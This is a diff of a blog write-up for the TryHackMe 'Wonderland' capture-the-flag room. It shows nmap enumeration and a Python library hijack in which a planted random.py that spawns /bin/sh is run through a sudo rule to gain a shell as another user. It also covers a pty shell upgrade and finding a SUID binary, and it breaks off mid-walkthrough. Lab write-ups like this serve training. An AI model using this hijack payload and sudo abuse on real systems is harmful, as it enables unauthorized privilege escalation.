@@ -8,8 +8,13 @@ image: thm_wonderland.jpg
 permalink: /tryhackme/wonderland-writeup
 ---
 <div align="center"><b>“Fall down the rabbit hole and enter wonderland”</b></div>
+
+### Introduction
+
+This is a writeup of the Alice In Wonderland-themed TryHackMe capture the flag challenge, [Wonderland](https://tryhackme.com/room/wonderland). This challenge has been rated medium difficulty. There are two flags to find - we know that there is a flag in a file called ```user.txt```, and a root flag in ```root.txt```.
+
 ### Enumeration
-We know that there is a flag in a file called ```user.txt```, and a root flag in ```root.txt```. We start with an nmap scan, to see which ports are open and what services are running. We scan for service versions, operating systems, and utilise common scripts.
+ We start with an nmap scan, to see which ports are open and what services are running. We scan for service versions, operating systems, and utilise common scripts.
 
 ##### Command:
 > sudo nmap -sC -sV -A -O [target]
@@ -152,7 +157,7 @@ Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
 alice@wonderland:~$
 ```
 
-We snoop around alice’s home directory. We find out that this is an Ubuntu machine using the command ```uname -a```. We find two interesting files - ```root.txt``` and ```walrus_and_the_carpenter.py``` - a python script. When we examine the python script, we find this:
+We snoop around ```alice```’s home directory. We find out that this is an Ubuntu machine using the command ```uname -a```. We find two interesting files - ```root.txt``` and ```walrus_and_the_carpenter.py``` - a python script. We have found the root flag, but naturally ```alice``` doesn't have correct permissions to open it. There is no sign of the other flag. When we examine the python script, we find this:
 
 {% highlight python %}
 import random
@@ -212,4 +217,117 @@ User alice may run the following commands on wonderland:
 	(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 ```
 
-Alice can run ```python3.6```, and the poem script, as the ```rabbit``` user!
+Alice can run python, and the poem script, as the ```rabbit``` user! However, the current user ```alice``` does not have permissions to write to the file. Nevertheless, we can still exploit this misconfiguration. Notice that the python script imports the ```random``` module. We locate this file, then check its permissions.
+
+##### Commands:
+> locate random.py
+ls -l [location[/random.py]
+
+```
+alice@wonderland:~$ locate random.py
+/usr/lib/python3.6/random.py
+
+alice@wonderland:~$ ls -l /usr/lib/python3.6/random.py
+-rw-r--r-- 1 root root 27442 Apr 18  2020 /usr/lib/python3.6/random.py
+```
+My first thought was to edit the ```random.py``` file, but we do not have write permissions. However, there is another avenue for exploitation. When python imports modules, it has a ‘priority’ list of locations it searches for the requested module. We can find the list of locations that python will fetch modules from.
+
+##### Command:
+> python3.6 -c ‘import sys; print(sys.path)’
+
+```
+alice@wonderland:~$ python3.6 -c 'import sys; print(sys.path)'
+['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
+```
+
+We notice something strange. The first place python searches for requested modules is a blank space - this means python will search the user’s current directory before searching any of the predefined directories. Our course of action is therefore to write a Python file called ```random.py```, and store it in the directory ```/home/alice```. In this file, we will launch a shell. Due to the python file running as the ```rabbit``` user, this shell will launch as ```rabbit```! Because Python will check the current directory before the true location of ```random.py```, ```/usr/lib/python3.6```, our malicious ```random.py``` will run instead. This type of attack is known as a [Python Library Hijack](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8).
+
+##### Command:
+> nano random.py
+
+In the malicious ```random.py``` file, we insert the following code:
+{% highlight python %}
+Import os
+os.system(‘/bin/sh’)
+{% endhighlight %}
+
+The current directory now looks like this:
+```
+alice@wonderland:~$ ls
+random.py  root.txt  walrus_and_the_carpenter.py
+```
+
+We now run the file ```walrus_and_the_carpenter.py``` as the rabbit user.
+
+##### Command:
+> sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+```
+alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+$ whoami
+rabbit
+```
+
+This attack worked! The python file used our malicious ```random.py``` module, and started a ```rabbit``` shell. We now use the python ```pty``` module to gain a more stable shell.
+
+##### Command:
+> python3.6 -c 'import pty; pty.spawn("/bin/bash")'
+
+```
+alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+$ whoami
+rabbit
+$ python3.6 -c 'import pty; pty.spawn("/bin/bash")'               
+rabbit@wonderland:~$
+```
+
+We now have a snoop around ```rabbit```’s home directory.
+
+```
+rabbit@wonderland:~$ pwd
+/home/alice
+rabbit@wonderland:~$ cd ../rabbit
+rabbit@wonderland:/home/rabbit$ ls -la
+total 40
+drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
+drwxr-xr-x 6 root   root	4096 May 25  2020 ..
+lrwxrwxrwx 1 root   root   	9 May 25  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
+-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
+-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
+-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
+```
+
+We find a file called ```teaParty```, which as SUID permissions enabled. Let’s investigate this with the ```file``` command.
+
+##### Command:
+> file teaParty
+
+``rabbit@wonderland:/home/rabbit$ file teaParty
+teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
+```
+It appears that ```teaParty``` is an ELF executable file.
+
+Before, running this executable, I wanted to investigate any strings remaining in the compiled binary. Unfortunately, the ```strings``` program, which extracts strings out of compiled binaries, is not installed.
+
+##### Command:
+> strings teaParty
+
+```
+rabbit@wonderland:/home/rabbit$ strings teaParty
+Command 'strings' not found, but can be installed with:
+apt install binutils
+Please ask your administrator.
+```
+
+We run the executable.
+
+```
+rabbit@wonderland:/home/rabbit$ ./teaParty
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by Fri, 16 Dec 2022 03:20:31 +0000
+Ask very nicely, and I will give you some tea while you wait for him
+```
+
+It appears we have to wait an hour from the current time (yes, I am doing this CTF at 02:20…)
